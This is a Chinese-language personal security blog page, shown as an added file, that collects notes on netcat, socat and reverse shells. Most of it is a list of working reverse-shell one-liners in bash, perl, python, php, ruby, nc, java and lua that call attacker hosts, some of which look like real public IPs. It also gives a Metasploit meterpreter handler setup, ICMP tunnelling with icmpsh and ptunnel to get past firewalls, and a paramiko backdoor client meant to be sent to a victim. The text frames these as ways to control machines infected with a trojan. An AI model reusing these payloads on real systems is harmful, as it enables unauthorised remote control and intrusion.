@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>77nc、socat | JohnScott2046的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott2046</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>77nc、socat</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2022-07-01
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="77ncsocat"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>网络安全(一)nc、socat</p>
+<h2 id="一、-反弹shell"><a href="#一、-反弹shell" class="headerlink" title="一、 反弹shell"></a>一、 反弹shell</h2><p>本地监听一个tcp/udp端口，被控端发起一个连接，并将其命令行的输入输出转到本机的过程</p>
+<h3 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h3><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+<ol>
+<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li>
+<li>目标机器的ip动态改变，你不能持续控制。</li>
+<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>
+</ol>
+<p>反弹，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<h2 id="二、-nc"><a href="#二、-nc" class="headerlink" title="二、 nc"></a>二、 nc</h2><p>64位<br>yum install nc.x86_64</p>
+<p>32位<br>wget <a target="_blank" rel="noopener" href="http://vault.centos.org/6.6/os/i386/Packages/nc-1.84-22.el6.i686.rpm">http://vault.centos.org/6.6/os/i386/Packages/nc-1.84-22.el6.i686.rpm</a></p>
+<p>protocol not available这个提示<br>yum erase nc<br>wget <a target="_blank" rel="noopener" href="http://vault.centos.org/6.6/os/x86_64/Packages/nc-1.84-22.el6.x86_64.rpm">http://vault.centos.org/6.6/os/x86_64/Packages/nc-1.84-22.el6.x86_64.rpm</a><br>rpm -iUv nc-1.84-22.el6.x86_64.rpm</p>
+<h3 id="测试目标服务器UDP端口的连通性"><a href="#测试目标服务器UDP端口的连通性" class="headerlink" title="测试目标服务器UDP端口的连通性"></a>测试目标服务器UDP端口的连通性</h3><p>nc -lvp 9999</p>
+<p>nc -vuz 目标服务器IP 待测试端口<br>    -l   开启监听<br>    -p   指定一个端口<br>    -v   显示详细输出<br>    -e   指定对应的应用程序<br>    -n   nc不要DNS反向查询IP的域名<br>    -z   连接成功后立即关闭连接</p>
+<h3 id="bash版本"><a href="#bash版本" class="headerlink" title="bash版本"></a>bash版本</h3><p>bash -i &gt;&amp; /dev/tcp/192.168.1.1/9999 0&gt;&amp;1</p>
+<p>/bin/bash -i &gt; /dev/tcp/192.168.1.1/9999 0&lt;&amp; 2&gt;&amp;1</p>
+<p>exec 5&lt;&gt;/dev/tcp/192.168.1.1/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done</p>
+<p>exec /bin/sh 0&lt;/dev/tcp/192.168.1.1/9999 1&gt;&amp;0 2&gt;&amp;0</p>
+<p>0&lt;&196;exec 196&lt;&gt;/dev/tcp/192.168.1.1/9999; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p>
+<p>bash -i创建一个交互式的bash，&amp;&gt;将bash的标准输出重定向到/dev/tcp/192.168.1.1/9090的socket连接上，0&gt;&amp;1将标准输入重定向到标准输出；<br>最终的结果就是标准输入也被重定向到了TCP连接中，因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互</p>
+<p>0 stdin_fileno 标准输入 键盘<br>1 stdout_fileno 标准输出 显示屏<br>2 stderr_fileno 标准错误</p>
+<p>输入输出重定向</p>
+<ol>
+<li>重定向输入就是在命令中指定具体的输入来源，譬如 cat &lt; 1.txt</li>
+<li>输出重定向是指定具体的输出目标以替换默认的标准输出 譬如 ls &gt; 1.txt <blockquote>
+<p>和&gt;&gt;的区别  &gt;用于新建  而&gt;&gt;用于追加</p>
+</blockquote>
+</li>
+<li>2&gt;&amp;1&amp; 用来将标准错误2重定向到标准输出1中<br>此处1前面的&amp;就是为了让bash将1解释成标准输出而不是文件1<br>最后一个&amp;，则是让bash在后台执行</li>
+<li>/dev/tcp/192.168.1.1/9999，这是一个特殊文件，它会建立一个连接到 192.168.1.1:9999 的socket</li>
+</ol>
+<h3 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本"></a>perl版本</h3><p>perl -e ‘use Socket;$i=”10.0.0.1”;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
+<h3 id="python版本"><a href="#python版本" class="headerlink" title="python版本"></a>python版本</h3><p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.1”, 6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+<h3 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h3><p>php -r ‘$sock=fsockopen(“10.10.10.11”,443);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
+<p>php -r ‘$s=fsockopen(“10.10.10.11”,443);$proc=proc_open(“/bin/sh -i”, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);’</p>
+<p>php -r ‘$s=fsockopen(“10.10.10.11”,443);shell_exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
+<p>php -r ‘$s=fsockopen(“10.10.10.11”,443);<code>/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3</code>;’</p>
+<p>php -r ‘$s=fsockopen(“10.10.10.11”,443);system(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
+<p>php -r ‘$s=fsockopen(“10.10.10.11”,443);popen(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”, “r”);’</p>
+<h3 id="ruby版本"><a href="#ruby版本" class="headerlink" title="ruby版本"></a>ruby版本</h3><p>ruby -rsocket -e’f=TCPSocket.open(“10.0.0.1”,1234).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</p>
+<h3 id="nc版本"><a href="#nc版本" class="headerlink" title="nc版本"></a>nc版本</h3><p>nc -e /bin/sh 10.0.0.1 1234</p>
+<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</p>
+<p>nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</p>
+<h3 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h3><p>linux平台<br>r = Runtime.getRuntime()<br>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[])<br>p.waitFor()</p>
+<p>windows平台<br>String host=”127.0.0.1”;<br>int port=4444;<br>String cmd=”cmd.exe”;<br>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>
+<p>创建线程<br>Thread thread = new Thread(){<br>    public void run(){<br>        // Reverse shell here<br>    }<br>}<br>thread.start();</p>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>client 136<br>transit 142<br>server 103</p>
+<p>添加转发规则<br>netsh interface portproxy add v4tov4 listenaddress=192.168.111.132 listenport=7777 connectaddress=192.168.111.103 connectport=4444</p>
+<p>添加防火墙入站规则<br>netsh advfirewall firewall add rule name=”transit test” protocol=TCP dir=in localport=7777 action=allow</p>
+<p>Server<br>nc -lvp 4444</p>
+<p>client<br>nc -vv 192.168.111.132 7777</p>
+<p>查看端口转发规则<br>netsh interface portproxy show all</p>
+<p>清除端口转发规则<br>netsh interface portproxy delete v4tov4 listenaddress=192.168.111.132 listenport=7777</p>
+<p>清除防火墙规则<br>netsh advfirewall firewall delete rule name=”transit test”</p>
+<h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h3><p>Linux平台<br>lua -e “require(‘socket’);require(‘os’);t=socket.tcp();t:connect(‘10.10.10.11’,’443’);os.execute(‘/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3’);”</p>
+<p>Windows及Linux平台<br>lua5.1 -e ‘local host, port = “10.10.10.11”, 443 local socket = require(“socket”) local tcp = socket.tcp() local io = req</p>
+<p>enum_patches模块<br>可先利用enum_patches模块 收集补丁信息，列出可能存在的漏洞，然后查找可用的exploits进行提权</p>
+<p>run post/windows/gather/enum_patches<br>getsystem</p>
+<p>出现中文乱码可运行<br>chcp 65001</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set payload windows/x64/meterpreter/reverse_tcp<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 101.42.249.212<br>set lport 33333<br>exploit</p>
+<p>nc -v 34.81.230.75 1234<br>nc -lvvp 2222 -e /bin/bash</p>
+<p>php -r ‘$sock=fsockopen(“34.81.230.75”,4444);exec(“/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
+<h2 id="三、-socat"><a href="#三、-socat" class="headerlink" title="三、 socat"></a>三、 socat</h2><p>socat，是linux下的一个工具，其功能与有”瑞士军刀”之称的netcat类似，可以看做netcat的加强版。有一些netcat所不具备却又很有需求的功能，例如ssl连接</p>
+<p>官网下载地址 <a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a></p>
+<p>基本命令<br>socat [参数]  &lt;地址1&gt;  &lt;地址2&gt;</p>
+<p>需要提供两个地址，然后socat把这两个地址的数据流串起来，左边地址的输出数据传给右边，同时把右边输出的数据传到左边；</p>
+<p>支持TCP, TCP-LISTEN, UDP, UDP-LISTEN, OPEN, EXEC, SOCKS, PROXY 等多种协议，用于端口监听、链接，文件和进程读写，代理桥接等等</p>
+<h3 id="网络测试"><a href="#网络测试" class="headerlink" title="网络测试"></a>网络测试</h3><p>类似 nc 的连通性测试，两台主机到底网络能否联通</p>
+<p>socat - TCP-LISTEN:9999               终端1上启动 server 监听 TCP<br>socat - TCP:localhost:9999            终端2上启动 client 链接 TCP</p>
+<p>因为两条命令都是把标准输入输出和网络串起来，因此把两个地址交换一下也是等价的</p>
+<h3 id="额外参数"><a href="#额外参数" class="headerlink" title="额外参数"></a>额外参数</h3><p>socat - TCP-LISTEN:9999,fork,reuseaddr    终端1上启动 server<br>socat - TCP:localhost:9999                终端2上启动 client</p>
+<p>fork参数，可以同时应答多个链接过来的客户端，每个客户端会fork一个进程出来进行通信；<br>reuseaddr参数，可以防止链接没断开 无法监听的问题；</p>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>socat TCP-LISTEN:8080,fork,reuseaddr  TCP:192.168.1.230:80</p>
+<p>在主机上监听一个 8080 端口，将 8080 端口所有流量转发给远程机器的 80 端口，那么连到这台机器上 8080 端口的所有链接，相当于链接了 192.168.1.230 这台机器的 80 端口，命令中交换左右两个地址一样是等价的</p>
+<p>nc做转发时只能转发1次，第一条链 accept 并且关闭以后 nc 就退出了，无法接受新链接，因此 nc 只适合单次使用；<br>而 socat 加上 fork 以后，每次都会 fork 出一份不影响接收其他的新连接，这样就可以当一个端口转发服务，一直启动在那里；</p>
+<h3 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h3><p>类型 EXEC 可以执行程序并且把输入输出和另外一个地址串起来</p>
+<p>socat TCP-LISTEN:8080,fork,reuseaddr  EXEC:/usr/bin/bash,pty,stderr     服务端<br>socat file:<code>tty</code>,raw,echo=0 TCP:localhost:8080                          客户端</p>
+<p>可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行；<br>客户端登录，还可以用 tty 的方式访问，这样基本就得到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序；</p>
+<p>socat TCP-LISTEN:23,reuseaddr,fork,crlf exec:/bin/login,pty,setsid,setpgid,stderr,ctty</p>
+<p>相当于在 23 端口启动了一个 telnetd 的服务，可以用 telnet 客户端来链接</p>
+<h3 id="网页服务"><a href="#网页服务" class="headerlink" title="网页服务"></a>网页服务</h3><p>web.sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line">echo -e -n &quot;HTTP&#x2F;1.0 200\r\n&quot;</span><br><span class="line">echo -e -n &quot;Content-Type:text&#x2F;html\r\n&quot;</span><br><span class="line">echo -e -n &quot;\r\n&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;html&gt;&lt;body&gt;&quot;</span><br><span class="line">echo &quot;now is $(date)&quot;</span><br><span class="line">echo &quot;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>用 SYSTEM 地址类型代替原来的 EXEC 执行命令</p>
+<p>socat TCP-LISTEN:8080,fork,reuseaddr SYSTEM:”bash web.sh”</p>
+<p>浏览器访问 <a target="_blank" rel="noopener" href="http://localhost:8080/">http://localhost:8080</a> </p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>socat -u TCP-LISTEN:8080 open:record.log,create    服务端接收文件<br>socat -u open:record.log TCP:localhost:8080        客户端发送文件</p>
+<p>-u参数，数据从左边的地址单向传输到右边的地址；<br>-U参数大写，是从右边单向传输到左边；</p>
+<h3 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h3><p>用于 socks 代理</p>
+<p>socat TCP-LISTEN:&lt;本地端口&gt;,reuseaddr,fork SOCKS:&lt;代理服务器IP&gt;:&lt;远程地址&gt;:&lt;远程端口&gt;,socksport=&lt;代理服务器端口&gt;</p>
+<p>用于 HTTP 代理</p>
+<p>socat TCP-LISTEN:&lt;本地端口&gt;,reuseaddr,fork PROXY:&lt;代理服务器IP&gt;:&lt;远程地址&gt;:&lt;远程端口&gt;,proxyport=&lt;代理服务器端口&gt;</p>
+<p>socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678</p>
+<p>链接本地 1234 端口，相当于通过代理服务器 127.0.0.1:5678 去链接 google.com 的 80 端口；<br>SOCKS4A，A是让代理服务器去解析域名；</p>
+<h2 id="四、-ICMP-icmpsh-协议反弹Shell"><a href="#四、-ICMP-icmpsh-协议反弹Shell" class="headerlink" title="四、 ICMP(icmpsh)协议反弹Shell"></a>四、 ICMP(icmpsh)协议反弹Shell</h2><p>ICMP隧道是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为Ping命令的回复，攻击者可以利用命令得到比回复更多的ICMP请求。在通常情况下，每个Ping命令都有相对应的回复与请求</p>
+<p>在一些条件下，如果攻击者使用各类隧道技术（HTTP，DNS，常规正反端口转发等）操作都失败了，常常会通过ping命令访问远程计算机，尝试进行ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙不会屏蔽ping数据包），实现不受限制的网络访问</p>
+<p>常见的ICMP隧道工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp等</p>
+<h2 id="五、-icmpsh-已用kali内网实现"><a href="#五、-icmpsh-已用kali内网实现" class="headerlink" title="五、 icmpsh(已用kali内网实现)"></a>五、 icmpsh(已用kali内网实现)</h2><p>下载地址 <a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p>
+<p>git clone <a href="https://github.com/bdamele/icmpsh.git">https://github.com/bdamele/icmpsh.git</a></p>
+<p>还需要安装 python的impacket类库</p>
+<p>apt install python-impacket<br>python -m pip install impacket</p>
+<p>安装pip<br>wget <a target="_blank" rel="noopener" href="https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz">https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz</a><br>tar zxvf setuptools-18.5.tar.gz<br>cd setuptools-18.5<br>python setup.py build<br>python setup.py install</p>
+<p>python2安装(推荐)<br>git clone <a href="https://github.com/CoreSecurity/impacket.git">https://github.com/CoreSecurity/impacket.git</a><br>cd impacket<br>sudo python setup.py install</p>
+<p>如果出现<br>Please make the appropriate changes for your system and try again<br>请使用管理员权限 </p>
+<p>ImportError: No module named markupsafe<br>pip install markupsafe<br>pip install jupyter</p>
+<p>No local packages or download links found for chardet<br>error: Could not find suitable distribution for Requirement.parse(‘chardet’)<br>pip install chardet</p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>因为icmpsh工具要代替系统本身的ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP答应，否则Shell的运行会不稳定<br>sysctl -w net.ipv4.icmp_echo_ignore_all=1</p>
+<p>恢复 sysctl -w net.ipv4.icmp_echo_ignore_all=0</p>
+<p>python icmpsh_m.py 攻击机ip 目标机ip</p>
+<p>python icmpsh_m.py 192.168.1.230  192.168.1.200</p>
+<p>icmpsh.exe -t 192.168.1.230</p>
+<h3 id="PingTunnel-待实现"><a href="#PingTunnel-待实现" class="headerlink" title="PingTunnel(待实现)"></a>PingTunnel(待实现)</h3><p>可以跨平台使用。为了避免隧道被滥用，它可以为隧道设置一个密码</p>
+<p>apt install ptunnel</p>
+<p>下载地址 <a target="_blank" rel="noopener" href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
+<p>下载之后 直接进行安装  make &amp;&amp; make install</p>
+<h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h3><p>需要安装libpcap（数据包捕获函数库）<br>gcc -Wall -g <code>[ -e /usr/include/selinux/selinux.h ] &amp;&amp; echo -DHAVE_SELINUX</code> -c -o md5.o md5.c<br>gcc -o ptunnel ptunnel.o md5.o -lpthread -lpcap <code>[ -e /usr/include/selinux/selinux.h ] &amp;&amp; echo -lselinux</code></p>
+<p>wget <a target="_blank" rel="noopener" href="http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz">http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</a><br>tar zxvf libpcap-1.9.0.tar.gz<br>cd libpcap-1.9.0<br>./configure</p>
+<p>出现 ‘yacc’包错误<br>sudo apt-get install -y byacc<br>man pcap</p>
+<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>外网主机 35.241.127.243</p>
+<p>跳板机 192.168.1.230<br>目标机 192.168.1.55  </p>
+<ol>
+<li>先在跳板机安装ptunnel 开启服务<br>sudo ptunnel -x [密码]<br>sudo ptunnel -x test20466</li>
+</ol>
+<ol start="2">
+<li>外网主机开启服务</li>
+</ol>
+<p>ptunnel -p linux跳板ip -lp 1080 -da 内网目标ip -dp 22 -x [密码]<br>-x：指定ICMP隧道连接的密码<br>-lp：指定要监听的本地TCP端口<br>-da：指定要转发的目标机器的IP地址<br>-dp：指定要转发目标机器的TCP端口<br>-p：指定ICMP隧道另一段的机器IP地址</p>
+<p>ptunnel -p 35.241.127.243 -lp 1080 -da 192.168.1.200 -dp 22 -x test20466</p>
+<p>访问 外网主机35.241.127.243的1080端口时，把内网目标机192.168.1.55的22端口数据封装在ICMP隧道里，用跳板机192.168.1.230为ICMP跳板进行传输；</p>
+<p>最后，在本地访问 外网主机35.241.127.243 的1080端口，可以发现已经可以和 内网目标机192.168.1.55 的 22 进行连接了</p>
+<h2 id="六、-python-ssh反向连接"><a href="#六、-python-ssh反向连接" class="headerlink" title="六、 python-ssh反向连接"></a>六、 python-ssh反向连接</h2><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>有很多时候我们都需要通过流量加密来避免检测，就比如使用ssh进行连接，但是在很多windows电脑中，是没有安装ssh客户端的，而我们用python便可以很轻易的完成一个ssh的客户端，当我们将客户端发送给对方主机后，我们可以在本地运行服务端，让远程的windows来连接我们运行的ssh服务端，我们在服务端输入命令，则客户端会将我们的命令执行并将命令执行结果返回给我们</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>需要安装一个第三方模块，paramiko 可以通过pip直接下载安装</p>
+<p>sudo apt install python3-pip</p>
+<p>python3 -m pip install paramiko</p>
+<h3 id="客户端的代码"><a href="#客户端的代码" class="headerlink" title="客户端的代码"></a>客户端的代码</h3><p>创建一个文件 ssh_client.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import paramiko</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def ssh_command(ip,user,passwd,command,port):</span><br><span class="line">    client &#x3D; paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip,port,username&#x3D;user,password&#x3D;passwd)</span><br><span class="line">    ssh_session &#x3D; client.get_transport().open_session()</span><br><span class="line">    if ssh_session.active:</span><br><span class="line">        ssh_session.send(command)</span><br><span class="line">        print(ssh_session.recv(1024))</span><br><span class="line">        while True:</span><br><span class="line">            command &#x3D; ssh_session.recv(1024)</span><br><span class="line">            try:</span><br><span class="line">                cmd_output &#x3D; subprocess.check_output(command,shell&#x3D;True)</span><br><span class="line">                ssh_session.send(cmd_output)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                ssh_session.send(str(e))</span><br><span class="line">        client.close()</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">ip &#x3D;sys.argv[1]</span><br><span class="line">ssh_command(ip, &#39;scott&#39;, &#39;1989&#39;, &#39;nihao&#39;, 28001)</span><br></pre></td></tr></table></figure>
+
+<p>python3 ssh_client.py 101.42.249.212</p>
+<p>创建了一个ssh用来执行命令的函数，然后使用paramiko模块中的SSHClient创建一个ssh的客户端，然後设置保存目标ssh服务器的密钥。尝试根据输入的IP、端口、用户名和密码去连接我们的ssh服务器，当连接建立成功后，在后一行打开一个会话。最后给服务器随便发一个命令，告诉他我们连接成功了，然后等待服务器回应，服务器回应后，开启一个死循环，等待服务器传入命令，执行后发送执行结果返回给服务器。</p>
+<p>因为paramiko模块的存在，我们还是可以狠狠轻易的完成这个ssh客户端，而不需要我们去从底层一点点点来写。</p>
+<h3 id="服务端的代码"><a href="#服务端的代码" class="headerlink" title="服务端的代码"></a>服务端的代码</h3><p>创建一个文件 ssh_server.py</p>
